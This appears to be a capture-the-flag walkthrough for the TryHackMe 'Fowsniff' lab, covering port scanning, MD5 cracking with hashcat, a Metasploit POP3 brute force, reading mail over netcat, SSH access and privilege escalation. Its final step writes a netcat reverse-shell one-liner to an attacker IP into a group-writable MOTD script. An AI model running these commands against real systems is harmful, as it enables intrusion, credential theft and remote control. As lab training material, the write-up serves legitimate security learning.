---
description: https://tryhackme.com/room/ctf
---

# Fowsniff CTF

### **What ports are open?**

```
nmap 10.10.147.108
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 16-31-18.png>)

### **Look around. What can you find?**

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-21-55.png>)

### **Using Google, can you find any public information about them?**

![](<../../.gitbook/assets/Screenshot from 2020-09-24 16-33-56.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 16-35-09.png>)

### **Can you decode these md5 hashes?**

```
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 16-38-18.png>)

### **Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?**

```
msfconsole -q
msf > search pop3
msf > use 0
msf > set RHOSTS 10.10.147.108
msf > set USERPASS_FILE userpass.txt
msf > unset USER_FILE
msf > unset PASS_FILE
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-00-55.png>)

### **What was seina's password to the email service?**

> scoobydoo2

### **Looking through her emails, what was a temporary password set for her?**

```
nc 10.10.147.108 110
USER seina
PASS scoobydoo2
LIST
RETR 1
RET 2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-06-31.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-12-51.png>)

### **Using the password from the previous question and the senders username, connect to the machine using SSH. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?**

```
ssh baksteen@10.10.147.108
id
find / -type f -group users 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-14-10.png>)

### **Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?**

```
tail /etc/update-motd.d/00-header
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.101.193 4444 >/tmp/f' > /opt/cube/cube.sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-16-51.png>)

### **Start a netcat listener and then re-login to the SSH service.**

```
nc -nvlp 4444
# id
```

![](<../../.gitbook/assets/Screenshot from 2020-09-24 17-20-24.png>)

### :link: Support Material

{% embed url="https://www.shellhacks.com/retrieve-email-pop3-server-command-line/" %}

